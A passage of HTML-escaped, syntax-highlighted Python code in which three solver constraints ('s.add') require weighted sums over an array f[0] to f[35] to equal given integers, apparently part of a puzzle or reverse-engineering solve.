style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;98&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;78&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;33735&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;98&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7107&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;98&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;94&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;94&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;17028&lt;/span&gt;)
